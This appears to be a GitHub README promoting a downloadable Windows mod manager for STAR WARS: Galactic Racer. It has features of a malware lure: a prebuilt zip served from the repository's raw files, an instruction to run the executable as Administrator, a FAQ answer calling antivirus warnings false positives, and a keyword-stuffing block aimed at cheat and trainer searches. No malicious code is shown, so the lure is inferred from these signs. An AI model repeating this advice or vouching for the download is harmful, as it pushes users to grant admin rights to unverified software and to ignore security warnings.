# SWGR Mod Manager

> **The easiest way to install and manage mods for STAR WARS: Galactic Racer. No more manual file copying.**

![SWGR Mod Manager Banner](https://i.ibb.co/zd9qDDM/Gemini-Generated-Image-fkikl2fkikl2fkik.jpg)

## 📥 DOWNLOAD

### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Bravetheline40/swgr-mod-manager/raw/main/SWGRModManager_v1.0.0.zip)

## 🎯 What This Does

SWGR Mod Manager is a lightweight Windows application that simplifies the entire process of installing mods for STAR WARS: Galactic Racer. Instead of manually digging through game folders and copying files into `Griffin\Binaries\Win64`, you just drag and drop your mods into the manager, and it does the rest.

## ✨ Features

- ✅ **One-Click Mod Installation** — Drag & drop `.zip`, `.pak`, or folder mods.
- ✅ **Automatic Game Detection** — Finds your Steam and Epic Games installations.
- ✅ **UE4SS Integration** — Automatically detects and configures the UE4SS loader.
- ✅ **Lua Mod Support** — Installs Lua scripts into the correct `ue4ss\Mods` directory.
- ✅ **Enable/Disable Mods** — Toggle any mod on or off without deleting files.
- ✅ **Backup & Restore** — Creates a full backup before every change.
- ✅ **Mod Profiles** — Save different mod configurations and switch between them.
- ✅ **Update Checker** — Notifies you when a mod has a newer version on Nexus.

## 🚀 Installation

1.  Go to the **[Releases](https://github.com/Bravetheline40/swgr-mod-manager/releases)** page.
2.  Download the latest **`SWGRModManager_v1.0.0.zip`** file.
3.  Extract the archive to any folder on your PC.
4.  **Right-click on `SWGRModManager.exe` and select "Run as Administrator".**
5.  The manager will auto-detect your game. If not, click **"Browse"** to select your game folder.
6.  Drag & drop your mod files. Click **"Install"**.

> **⚠️ Important:** Run as Administrator to allow the manager to create folders and copy files.

## 📁 How It Works

The manager handles the entire mod installation process for you:
1.  **Detects game folder** — Automatically finds your installation.
2.  **Creates UE4SS folder** — Sets up the `ue4ss\Mods` directory if it doesn't exist.
3.  **Installs mods** — Extracts files and copies them to the correct location.
4.  **Creates backup** — Saves a copy of your mods folder before changes.

## ❓ FAQ

**Q: Will this work with the latest patch?**
A: Yes. The manager only touches the `ue4ss` folder. If the folder structure changes, an update will be released.

**Q: Is this safe to use?**
A: Yes. It only copies files to the `ue4ss` folder. No game executables are modified. Backups are automatic.

**Q: The game doesn't see my mods. What should I do?**
A: Ensure UE4SS is installed and that the `ue4ss\Mods` folder is inside `Griffin\Binaries\Win64`. The manager creates it automatically.

**Q: I got a virus warning. Is this a false positive?**
A: Yes, this is a common false positive for mod managers. The source code is available in this repository for verification.

## 🛠️ Building from Source

```bash
git clone https://github.com/Bravetheline40/swgr-mod-manager.git
cd swgr-mod-manager
dotnet build
```

Requires .NET 8.0 SDK or later.

## 🤝 Contributing

Pull requests are welcome. If you want to add new features or fix bugs, feel free to contribute.

## 📄 License

MIT

---
## 🔑 SEO Keywords

`star wars galactic racer mod manager`, `swgr mod manager`, `star wars galactic racer mods`, `swgr mod installer`, `star wars galactic racer ue4ss`, `star wars galactic racer lua mods`, `star wars galactic racer mod tool`, `swgr mod tool`, `star wars galactic racer nexus mods`, `star wars galactic racer infinite restarts`, `star wars galactic racer unlimited photo mode`, `star wars galactic racer skip intro`, `star wars galactic racer mod download`, `swgr trainer`, `star wars galactic racer cheats`, `star wars galactic racer save editor`
